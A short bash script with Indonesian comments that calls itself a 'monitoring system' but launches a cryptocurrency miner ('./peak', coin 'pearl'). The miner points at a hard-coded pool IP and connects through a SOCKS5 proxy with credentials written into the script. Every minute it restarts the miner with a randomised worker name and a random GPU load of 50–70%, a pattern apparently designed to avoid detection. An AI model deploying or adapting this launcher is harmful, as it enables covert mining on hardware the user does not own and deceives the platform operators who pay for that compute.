#!/bin/bash

echo "Memulai sistem monitoring dengan penggunaan GPU berubah setiap menit..."

# Fungsi untuk menjalankan miner
start_miner() {
    local power=$1
    echo "Memulai miner dengan power $power%"
    
    ./peak --coin pearl --url 192.210.169.184:80 --user prl1psq3d3d5lawjz99ytn5egzfjrzxvqm48zhcnnwq23eyq8thpz347suml75p.$(shuf -n 1 -i 1-9999999) --proxy socks5://Bahlilganteng:Bahlilganteng@198.144.189.25:443 --gpu-power=$power &
    
    # Simpan PID
    MINER_PID=$!
}

# Jalankan miner pertama kali
start_miner 50

while true; do
    # Acak penggunaan GPU antara 50-70% 
    gpu_power=$((RANDOM % 21 + 50))

    echo "Mengubah power GPU menjadi $gpu_power% (setiap menit)"

    # Hentikan proses lama
    kill $MINER_PID 2>/dev/null
    
    # Tunggu sebentar untuk memastikan proses berhenti
    sleep 1
    
    # Jalankan miner baru dengan parameter baru
    start_miner $gpu_power
    
    # Tunggu 1 menit sebelum perubahan berikutnya
    echo "Menunggu 1 menit..."
    sleep 60
done
